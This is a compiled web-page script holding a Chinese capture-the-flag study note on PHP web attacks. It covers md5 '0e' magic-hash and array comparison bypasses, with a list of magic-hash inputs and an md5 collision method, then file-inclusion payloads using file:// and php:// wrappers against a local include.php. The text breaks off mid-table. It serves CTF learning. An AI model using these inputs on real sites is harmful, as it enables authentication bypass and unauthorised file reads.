import{_ as p}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as i,o,c as l,a as n,b as s,d as e,e as t}from"./app-l-JklxL5.js";const c="/DailyNotes/assets/1723443073686-5b063869-00fe-4b1e-9c56-7725ef648760-q09qAWSH.png",d="/DailyNotes/assets/1723443990504-3cbbfbb8-44db-483b-91d1-f250f3732497-MuYt7Qdm.jpeg",r="/DailyNotes/assets/1723444019927-4af6822b-4053-477d-a114-a7028a5e6a4f-4UPWDayq.jpeg",u="/DailyNotes/assets/1028937-20210813223807312-1920084303-7-6TVp5r.png",m="/DailyNotes/assets/1028937-20210813223704009-2058159871-nUwoBVor.png",v="/DailyNotes/assets/1028937-20210813223612557-1583276200-r5D8B7kN.png",k="/DailyNotes/assets/1028937-20210812220502399-2146878296-3Ch0vhYW.png",b="/DailyNotes/assets/1028937-20210812221853105-890851667-qVxGliv1.png",g="/DailyNotes/assets/1028937-20210812220837399-1461005175-9gm-0p23.png",h="/DailyNotes/assets/image-20240812152610387--_QFOu8s.png",f="/DailyNotes/assets/image-20240812152710006-MnNOEGzY.png",_="/DailyNotes/assets/image-20240812152543637-Wny0Fdk8.png",q="/DailyNotes/assets/bVbrQAZ-1dZ8Uxp7.png",y="/DailyNotes/assets/bVbrQA1-whjDGIsR.png",w="/DailyNotes/assets/bVbrQBb-GNLMlzEn.png",x="/DailyNotes/assets/bVbrQBf-bluJ-369.png",z="/DailyNotes/assets/bVbrQBh-DSQXJXRT.png",P="/DailyNotes/assets/bVbrQBi-5VOz85EB.png",D="/DailyNotes/assets/bVbrQBj-_JCJ7txB.png",$="/DailyNotes/assets/bVbrQBt-dZfb7K99.png",H="/DailyNotes/assets/bVbrQBu-LhSiQpaz.png",N="/DailyNotes/assets/bVbrQBD-cIksd3mW.png",T="/DailyNotes/assets/bVbrQBP-LSN9ydzF.png",B="/DailyNotes/assets/bVbrQBX-IIPOCnGl.png",E="/DailyNotes/assets/image-20240812165242418-JdRyv-Dw.png",W="/DailyNotes/assets/image-20240812165631950-ygN5z1TL.png",O="/DailyNotes/assets/image-20240812173258342-h-o7fCfM.png",Q="/DailyNotes/assets/image-20240812173341997-uZsvyn_r.png",V="/DailyNotes/assets/image-20240812173552674-pGHlfNKF.png",C="/DailyNotes/assets/image-20240812175337606-DdSREU9A.png",G="/DailyNotes/assets/image-20240812180149556-2oOweZ_e.png",A="/DailyNotes/assets/image-20240812180404781-wK1-qkAE.png",F="/DailyNotes/assets/image-20240813220240174-8jlQrXa_.png",S={},I=t('<h1 id="ctf-web" tabindex="-1"><a class="header-anchor" href="#ctf-web" aria-hidden="true">#</a> CTF-WEB</h1><h2 id="_1-php-md5-相等绕过" tabindex="-1"><a class="header-anchor" href="#_1-php-md5-相等绕过" aria-hidden="true">#</a> 1. PHP md5 相等绕过</h2><p>要求字符串不同，但MD5相同</p><figure><img src="'+c+'" alt="image.png" tabindex="0" loading="lazy"><figcaption>image.png</figcaption></figure>',4),L={href:"https://www.cnblogs.com/ainsliaea/p/15126218.html",target:"_blank",rel:"noopener noreferrer"},R=t('<p><strong>方法1：</strong> 处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，同时后面都是数字，不能包含其他字符的字符串，md5 值会相等（<code>==</code> 的结果为 True，但 <code>===</code> 的结果为 False）。那么PHP会认为它们相同</p><figure><img src="'+d+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>方法2：</strong> 使用数组绕过，在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p><figure><img src="'+r+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>',4),X=n("strong",null,"方法3：",-1),j={href:"https://www.win.tue.nl/hashclash/",target:"_blank",rel:"noopener noreferrer"},Z=n("h3",{id:"oe-绕过",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#oe-绕过","aria-hidden":"true"},"#"),s(' "oe" 绕过')],-1),M={href:"https://www.cnblogs.com/ainsliaea/p/15126218.html#fn1",target:"_blank",rel:"noopener noreferrer"},U=t(`<blockquote><p>因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</p></blockquote><p>基本的原理是这样的，但更严谨的字符串格式是，<code>0e</code> 开头，同时后面都是数字，不能包含其他字符的字符串，md5 值才会相等（<code>==</code> 的结果为 True，但 <code>===</code> 的结果为 False）。</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;s878926199a&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;s155964671a&quot;</span><span class="token punctuation">;</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;--&gt;&quot;</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;--&gt;&quot;</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// s878926199a--&gt;0e545993274517709034328855841020</span>
<span class="token comment">// s155964671a--&gt;0e342768416822451524974117254469</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bool(true)</span>

<span class="token comment">// 数字 vs 数字</span>
<span class="token variable">$a1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;0e33&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$b1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;0e89&quot;</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a1</span> <span class="token operator">==</span> <span class="token variable">$b1</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bool(true)</span>

<span class="token comment">// 数字 vs 字母</span>
<span class="token variable">$a3</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;0eadd&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$b3</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;0e232&quot;</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a3</span> <span class="token operator">==</span> <span class="token variable">$b3</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bool(false)</span>

<span class="token comment">// 数字 vs 数字/字母</span>
<span class="token variable">$a4</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;0ea34343dd&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$b4</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;0e232&quot;</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a4</span> <span class="token operator">==</span> <span class="token variable">$b4</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bool(false)</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>常见的 md5 值是 <code>0e</code> 开头且后面均为数字的字符串</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>s878926199a
<span class="token number">0e545993274517709034328855841020</span>
s155964671a
<span class="token number">0e342768416822451524974117254469</span>
s214587387a
<span class="token number">0e848240448830537924465865611904</span>
s214587387a
<span class="token number">0e848240448830537924465865611904</span>
s878926199a
<span class="token number">0e545993274517709034328855841020</span>
s1091221200a
<span class="token number">0e940624217856561557816327384675</span>
s1885207154a
<span class="token number">0e509367213418206700842008763514</span>
s1502113478a
<span class="token number">0e861580163291561247404381396064</span>
s1885207154a
<span class="token number">0e509367213418206700842008763514</span>
s1836677006a
<span class="token number">0e481036490867661113260034900752</span>
s155964671a
<span class="token number">0e342768416822451524974117254469</span>
s1184209335a
<span class="token number">0e072485820392773389523109082030</span>
s1665632922a
<span class="token number">0e731198061491163073197128363787</span>
s1502113478a
<span class="token number">0e861580163291561247404381396064</span>
s1836677006a
<span class="token number">0e481036490867661113260034900752</span>
s1091221200a
<span class="token number">0e940624217856561557816327384675</span>
s155964671a
<span class="token number">0e342768416822451524974117254469</span>
s1502113478a
<span class="token number">0e861580163291561247404381396064</span>
s155964671a
<span class="token number">0e342768416822451524974117254469</span>
s1665632922a
<span class="token number">0e731198061491163073197128363787</span>
s155964671a
<span class="token number">0e342768416822451524974117254469</span>
s1091221200a
<span class="token number">0e940624217856561557816327384675</span>
s1836677006a
<span class="token number">0e481036490867661113260034900752</span>
s1885207154a
<span class="token number">0e509367213418206700842008763514</span>
s532378020a
<span class="token number">0e220463095855511507588041205815</span>
s878926199a
<span class="token number">0e545993274517709034328855841020</span>
s1091221200a
<span class="token number">0e940624217856561557816327384675</span>
s214587387a
<span class="token number">0e848240448830537924465865611904</span>
s1502113478a
<span class="token number">0e861580163291561247404381396064</span>
s1091221200a
<span class="token number">0e940624217856561557816327384675</span>
s1665632922a
<span class="token number">0e731198061491163073197128363787</span>
s1885207154a
<span class="token number">0e509367213418206700842008763514</span>
s1836677006a
<span class="token number">0e481036490867661113260034900752</span>
s1665632922a
<span class="token number">0e731198061491163073197128363787</span>
s878926199a
<span class="token number">0e545993274517709034328855841020</span>
<span class="token number">240610708</span> 
<span class="token number">0e462097431906509019562988736854</span>
<span class="token number">314282422</span> 
<span class="token number">0e990995504821699494520356953734</span>
<span class="token number">571579406</span> 
<span class="token number">0e972379832854295224118025748221</span>
<span class="token number">903251147</span> 
<span class="token number">0e174510503823932942361353209384</span>
<span class="token number">1110242161</span> 
<span class="token number">0e435874558488625891324861198103</span>
<span class="token number">1320830526</span> 
<span class="token number">0e912095958985483346995414060832</span>
<span class="token number">1586264293</span> 
<span class="token number">0e622743671155995737639662718498</span>
<span class="token number">2302756269</span> 
<span class="token number">0e250566888497473798724426794462</span>
<span class="token number">2427435592</span> 
<span class="token number">0e067696952328669732475498472343</span>
<span class="token number">2653531602</span> 
<span class="token number">0e877487522341544758028810610885</span>
<span class="token number">3293867441</span> 
<span class="token number">0e471001201303602543921144570260</span>
<span class="token number">3295421201</span> 
<span class="token number">0e703870333002232681239618856220</span>
<span class="token number">3465814713</span> 
<span class="token number">0e258631645650999664521705537122</span>
<span class="token number">3524854780</span> 
<span class="token number">0e507419062489887827087815735195</span>
<span class="token number">3908336290</span> 
<span class="token number">0e807624498959190415881248245271</span>
<span class="token number">4011627063</span> 
<span class="token number">0e485805687034439905938362701775</span>
<span class="token number">4775635065</span> 
<span class="token number">0e998212089946640967599450361168</span>
<span class="token number">4790555361</span> 
<span class="token number">0e643442214660994430134492464512</span>
<span class="token number">5432453531</span> 
<span class="token number">0e512318699085881630861890526097</span>
<span class="token number">5579679820</span> 
<span class="token number">0e877622011730221803461740184915</span>
<span class="token number">5585393579</span> 
<span class="token number">0e664357355382305805992765337023</span>
<span class="token number">6376552501</span> 
<span class="token number">0e165886706997482187870215578015</span>
<span class="token number">7124129977</span> 
<span class="token number">0e500007361044747804682122060876</span>
<span class="token number">7197546197</span> 
<span class="token number">0e915188576072469101457315675502</span>
<span class="token number">7656486157</span> 
<span class="token number">0e451569119711843337267091732412</span>
<span class="token constant">QLTHNDT</span> 
<span class="token number">0e405967825401955372549139051580</span>
<span class="token constant">QNKCDZO</span> 
<span class="token number">0e830400451993494058024219903391</span>
<span class="token constant">EEIZDOI</span> 
<span class="token number">0e782601363539291779881938479162</span>
<span class="token constant">TUFEPMC</span> 
<span class="token number">0e839407194569345277863905212547</span>
<span class="token constant">UTIPEZQ</span> 
<span class="token number">0e382098788231234954670291303879</span>
<span class="token constant">UYXFLOI</span> 
<span class="token number">0e552539585246568817348686838809</span>
<span class="token constant">IHKFRNS</span> 
<span class="token number">0e256160682445802696926137988570</span>
<span class="token constant">PJNPDWY</span> 
<span class="token number">0e291529052894702774557631701704</span>
<span class="token constant">ABJIHVY</span> 
<span class="token number">0e755264355178451322893275696586</span>
<span class="token constant">DQWRASX</span> 
<span class="token number">0e742373665639232907775599582643</span>
<span class="token constant">DYAXWCA</span> 
<span class="token number">0e424759758842488633464374063001</span>
<span class="token constant">GEGHBXL</span> 
<span class="token number">0e248776895502908863709684713578</span>
<span class="token constant">GGHMVOE</span> 
<span class="token number">0e362766013028313274586933780773</span>
<span class="token constant">GZECLQZ</span> 
<span class="token number">0e537612333747236407713628225676</span>
<span class="token constant">NWWKITQ</span> 
<span class="token number">0e763082070976038347657360817689</span>
<span class="token constant">NOOPCJF</span> 
<span class="token number">0e818888003657176127862245791911</span>
<span class="token constant">MAUXXQC</span> 
<span class="token number">0e478478466848439040434801845361</span>
<span class="token constant">MMHUWUV</span> 
<span class="token number">0e701732711630150438129209816536</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="数组绕过-php-8-无法绕过" tabindex="-1"><a class="header-anchor" href="#数组绕过-php-8-无法绕过" aria-hidden="true">#</a> 数组绕过（PHP 8 无法绕过）</h3><p>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token comment">// /param.php?a[]=1&amp;b[]=2</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token constant">PHP_VERSION</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;a&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;b&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>PHP5 <img src="`+u+'" alt="image" loading="lazy"> PHP7 <img src="'+m+'" alt="image" loading="lazy"> 然而 PHP8。。。 <img src="'+v+'" alt="image" loading="lazy"></p><h3 id="md5-碰撞" tabindex="-1"><a class="header-anchor" href="#md5-碰撞" aria-hidden="true">#</a> md5 碰撞</h3><p>利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。 新建一个空的 txt 文档。 <img src="'+k+'" alt="image" loading="lazy"> 然后拖到 exe 上，自动生成两个文件。 <img src="'+b+'" alt="image" loading="lazy"> 得到两个文件，通过代码读取即可。 <img src="'+g+`" alt="image" loading="lazy"></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;D:tmp\\a_msg1.txt&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;D:tmp\\a_msg2.txt&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bool(false)</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// bool(true)</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,12),K={href:"https://www.cnblogs.com/ainsliaea/p/15126218.html#fn2",target:"_blank",rel:"noopener noreferrer"},J=n("hr",null,null,-1),Y={href:"https://www.cnblogs.com/ainsliaea/p/15126218.html#fnref1",target:"_blank",rel:"noopener noreferrer"},nn={href:"https://www.cnblogs.com/ainsliaea/p/15126218.html#fnref2",target:"_blank",rel:"noopener noreferrer"},sn=n("h2",{id:"_2-php文件包含-php伪协议",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#_2-php文件包含-php伪协议","aria-hidden":"true"},"#"),s(" 2. php文件包含&php伪协议")],-1),an={href:"https://segmentfault.com/a/1190000018991087",target:"_blank",rel:"noopener noreferrer"},en=t('<p>这里用到了**<code>php://filter</code>**，它主要用来读取文件源码。</p><p>题目首页</p><figure><img src="'+h+'" alt="image-20240812152610387" tabindex="0" loading="lazy"><figcaption>image-20240812152610387</figcaption></figure><p>遂<code>/?file=…</code>一个随意参数，而后得到源代码</p><figure><img src="'+f+'" alt="image-20240812152710006" tabindex="0" loading="lazy"><figcaption>image-20240812152710006</figcaption></figure><p>然后利用<code>php://</code>协议</p><figure><img src="'+_+'" alt="image-20240812152543637" tabindex="0" loading="lazy"><figcaption>image-20240812152543637</figcaption></figure><h3 id="file-协议" tabindex="-1"><a class="header-anchor" href="#file-协议" aria-hidden="true">#</a> <code>file://</code> 协议</h3>',8),tn=t(`<li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>： 用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。 <code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>： <code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><div class="language-pgsql line-numbers-mode" data-ext="pgsql"><pre class="language-pgsql"><code>/path/to/file.ext
relative/path/to/file.ext
fileInCwd.ext
C:/path/to/winfile.ext
C:\\path\\to\\winfile.ext
\\\\smbserver\\share\\path\\to\\winfile.ext
file:///path/to/file.ext
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p><strong>示例</strong>：</p><ol><li><p><code>file://[文件的绝对路径和文件名]</code></p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+q+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li><li><p><code>[文件的相对路径和文件名]</code></p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=./phpinfo.txt</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+y+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li><li><p><code>[http：//网络路径和文件名]</code></p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+w+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li></ol></li>',5),pn=n("strong",null,"参考",-1),on={href:"https://link.segmentfault.com/?enc=DuT6iHHjrv6yYwe%2FL%2BXwLw%3D%3D.khro9XPxRj3wwsu1ZqN%2FR%2Bc2T9GU1D2%2BPCinvjrKORB9TsauqGBqEgNvkasA34na",target:"_blank",rel:"noopener noreferrer"},ln=n("h3",{id:"php-协议",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#php-协议","aria-hidden":"true"},"#"),s(),n("code",null,"php://"),s(" 协议")],-1),cn=t("<li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li></ul></li><li><p><strong>作用</strong>： <code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>： PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table></li><li><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php://filter 